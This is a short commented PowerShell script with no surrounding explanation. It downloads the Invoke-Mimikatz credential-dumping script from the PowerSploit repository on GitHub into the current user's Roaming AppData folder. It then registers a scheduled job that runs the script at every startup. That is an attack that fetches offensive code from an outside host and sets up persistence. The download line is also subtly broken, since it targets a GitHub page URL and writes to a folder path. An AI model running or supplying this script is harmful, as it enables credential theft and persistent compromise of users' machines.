#Download our mimikatz script to users roaming folder
wget "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" -O C:\Users\$env:username\AppData\Roaming

#Create a trigger variable
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30

#Register the trigger as a job with the ps1 file and scheduled job name
Register-ScheduledJob -Trigger $trigger -FilePath C:\Users\$env:username\AppData\Roaming\Invoke-Mimikatz.ps1 -Name InvokeMimikatz


